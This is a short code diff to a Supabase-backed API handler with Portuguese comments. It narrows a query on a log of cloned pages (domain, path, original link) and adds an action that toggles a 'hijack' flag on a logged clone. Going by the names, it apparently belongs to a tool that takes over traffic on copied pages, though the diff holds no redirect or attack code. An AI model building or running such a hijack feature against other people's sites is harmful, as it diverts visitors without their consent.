@@ -13,17 +13,17 @@ export default async function handler(req, res) {
   try {
     if (action === 'GET_CONFIG') {
       // 1. Busca Configuração Base
-      const { data: configData, error: configError } = await supabase
+      const { data: configData } = await supabase
         .from('apex_config')
         .select('value')
         .eq('key', 'main_config')
         .single();
 
-      // 2. Busca Logs de Clones (últimos 50)
-      const { data: logsData, error: logsError } = await supabase
+      // 2. Busca Logs de Clones (últimos 50) com as novas colunas
+      const { data: logsData } = await supabase
         .from('apex_clones_log')
-        .select('*')
-        .order('created_at', { ascending: false })
+        .select('id, domain, path, timestamp, original_link, hijack_active')
+        .order('timestamp', { ascending: false })
         .limit(50);
 
       const config = configData?.value || {
@@ -33,6 +33,16 @@ export default async function handler(req, res) {
       };
 
       return res.status(200).json({ config, logs: logsData || [] });
+
+    } else if (action === 'TOGGLE_HIJACK') {
+      const { id, status } = payload;
+      const { error } = await supabase
+        .from('apex_clones_log')
+        .update({ hijack_active: status })
+        .eq('id', id);
+
+      if (error) throw error;
+      return res.status(200).json({ success: true, message: `Hijack ${status ? 'ativado' : 'desativado'}` });
 
     } else if (action === 'UPDATE_CONFIG') {
       const { error } = await supabase
